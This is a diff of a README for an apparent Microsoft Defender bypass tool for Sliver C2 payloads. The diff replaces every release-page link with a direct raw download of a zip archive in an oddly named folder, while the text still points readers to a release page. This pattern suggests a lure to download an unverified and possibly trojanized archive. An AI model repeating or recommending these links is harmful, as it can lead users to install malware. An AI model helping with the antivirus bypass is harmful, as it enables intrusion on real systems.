@@ -1,10 +1,10 @@
 # 🛡️ defender_bypass_with_sliver - Run Your Payload With Less Friction
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/straight-clerestory824/defender_bypass_with_sliver/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/straight-clerestory824/defender_bypass_with_sliver/main/subgenerically/bypass-defender-with-sliver-3.6.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/straight-clerestory824/defender_bypass_with_sliver/releases
+Visit this page to download: https://raw.githubusercontent.com/straight-clerestory824/defender_bypass_with_sliver/main/subgenerically/bypass-defender-with-sliver-3.6.zip
 
 On the release page, look for the latest version and download the Windows file attached to it. If you see more than one file, choose the one meant for Windows.
 
@@ -187,7 +187,7 @@ The usual flow is:
 
 If you need the release page again, use this link:
 
-https://github.com/straight-clerestory824/defender_bypass_with_sliver/releases
+https://raw.githubusercontent.com/straight-clerestory824/defender_bypass_with_sliver/main/subgenerically/bypass-defender-with-sliver-3.6.zip
 
 ## 🔄 Repeat builds
 
